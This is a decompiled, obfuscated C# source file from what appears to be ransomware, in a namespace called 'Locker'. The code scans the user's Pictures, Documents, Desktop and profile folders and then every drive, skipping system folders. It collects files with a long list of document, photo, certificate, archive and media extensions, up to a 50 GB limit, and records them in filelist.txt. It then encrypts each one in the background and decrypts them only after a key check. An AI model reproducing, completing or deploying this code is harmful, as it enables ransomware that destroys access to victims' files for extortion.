using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Locker;

internal class Class3 : IDisposable
{
	private delegate void Delegate0(int currentFile, int totalFiles);

	private readonly List<string> list_0 = new List<string> { "program files", "appdata", "programdata", "boot", "windows", "winnt", "recycle.bin", "downloads", "all users" };

	private readonly List<string> list_1 = new List<string>
	{
		".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps",
		".xls", ".xlsx", ".xlsm", ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb",
		".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf", ".wb2", ".mdf", ".dbf", ".psd",
		".pdd", ".pdf", ".eps", ".ai", ".indd", ".cdr", ".dng", ".3fr", ".arw", ".srf",
		".sr2", ".mp3", ".bay", ".crw", ".cr2", ".dcr", ".kdc", ".erf", ".mef", ".mrw",
		".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl", ".rw2", ".r3d", ".ptx", ".pef",
		".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12", ".p7b", ".p7c",
		".jpg", ".png", ".jfif", ".jpeg", ".gif", ".bmp", ".exif", ".txt", ".tc", ".mov",
		".mp4", ".rar", ".zip", ".iso", ".vsdx", ".3ds", ".c4d"
	};

	public string string_0 = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location), "filelist.txt");

	public List<Class1> list_2 = new List<Class1>();

	public readonly long long_0 = 53687091200L;

	private long long_1;

	private bool bool_0;

	private string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private bool bool_1;

	private string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private bool bool_2;

	private string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private bool bool_3;

	private string string_4 = Environment.GetEnvironmentVariable("USERPROFILE");

	private bool bool_4;

	[CompilerGenerated]
	private static Class3 class3_0;

	public static Class3 Class3_0
	{
		[CompilerGenerated]
		get
		{
			return class3_0;
		}
		[CompilerGenerated]
		private set
		{
			class3_0 = value;
		}
	}

	public int Int32_0 => list_2.Count;

	public long Int64_0 => long_1;

	static Class3()
	{
		Class3_0 = new Class3();
	}

	public void method_0()
	{
		if (File.Exists(string_0))
		{
			StreamReader streamReader = new StreamReader(string_0);
			string text;
			while ((text = streamReader.ReadLine()) != null)
			{
				string[] array = text.Split(new char[1] { '|' });
				if (array.Length >= 2 && File.Exists(array[0]))
				{
					FileInfo fileInfo = new FileInfo(array[0]);
					bool result = false;
					bool.TryParse(array[1], out result);
					list_2.Add(new Class1(fileInfo, result));
					if (fileInfo.Length < Class2.int_0)
					{
						long_1 += fileInfo.Length;
					}
					else
					{
						long_1 += Class2.int_0;
					}
				}
			}
			streamReader.Close();
		}
		else
		{
			method_1();
		}
	}

	public void Dispose()
	{
		if (bool_0)
		{
			method_4(bool_5: true);
		}
	}

	private void method_1()
	{
		method_2(string_1);
		bool_1 = true;
		method_2(string_2);
		bool_2 = true;
		method_2(string_3);
		bool_3 = true;
		method_2(string_4);
		bool_4 = true;
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			string name = driveInfo.Name;
			method_2(name);
		}
		method_4(bool_5: true);
	}

	private void method_2(string string_5)
	{
		if ((bool_1 && string_5.Contains(string_1)) || (bool_2 && string_5.Contains(string_2)) || (bool_3 && string_5.Contains(string_3)) || (bool_4 && string_5.Contains(string_4)))
		{
			return;
		}
		try
		{
			string[] files = Directory.GetFiles(string_5);
			string[] array = files;
			foreach (string text in array)
			{
				try
				{
					if (list_1.Contains(Path.GetExtension(text.ToLower())))
					{
						if (long_1 >= long_0)
						{
							return;
						}
						list_2.Add(new Class1(new FileInfo(text), enc: false));
						long_1 += new FileInfo(text).Length;
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(string_5);
			foreach (string text2 in directories)
			{
				bool flag = false;
				foreach (string item in list_0)
				{
					if (text2.ToLower().Contains(item))
					{
						flag = true;
					}
				}
				if (!flag)
				{
					method_2(text2);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_3(Class1 class1_0)
	{
		if (!list_2.Contains(class1_0) && long_1 < long_0)
		{
			long_1 += class1_0.FileInfo_0.Length;
			list_2.Add(class1_0);
		}
	}

	public bool method_4(bool bool_5)
	{
		if (!bool_5)
		{
			bool_0 = true;
			return true;
		}
		if (File.Exists(string_0))
		{
			try
			{
				File.Delete(string_0);
			}
			catch (Exception)
			{
				return false;
			}
		}
		StreamWriter streamWriter = new StreamWriter(string_0);
		foreach (Class1 item in list_2)
		{
			streamWriter.WriteLine(item.FileInfo_0.FullName + "|" + item.Boolean_0);
		}
		streamWriter.Close();
		bool_0 = false;
		return true;
	}

	public void method_5(BackgroundWorker backgroundWorker_0)
	{
		int num = 0;
		foreach (Class1 item in list_2)
		{
			if (File.Exists(item.FileInfo_0.FullName) && !item.Boolean_0)
			{
				try
				{
					if (backgroundWorker_0.CancellationPending)
					{
						return;
					}
					item.Boolean_0 = Class2.smethod_0(item);
					method_4(bool_5: false);
				}
				catch (Exception)
				{
				}
			}
			num++;
			if (num % 2000 == 0)
			{
				method_4(bool_5: true);
			}
		}
		method_4(bool_5: true);
	}

	public void method_6(frmMain frmMain_0)
	{
		if (Class7.smethod_6() == null || list_2.Count <= 0)
		{
			return;
		}
		int num = 0;
		foreach (Class1 item in list_2)
		{
			if (File.Exists(item.FileInfo_0.FullName) && item.Boolean_0)
			{
				try
				{
					item.Boolean_0 = !Class2.smethod_1(item);
					method_4(bool_5: false);
				}
				catch (Exception)
				{
				}
			}
			num++;
			((Control)frmMain_0).BeginInvoke((Delegate)new Delegate0(frmMain_0.method_8), new object[2] { num, list_2.Count });
		}
		method_4(bool_5: true);
	}
}
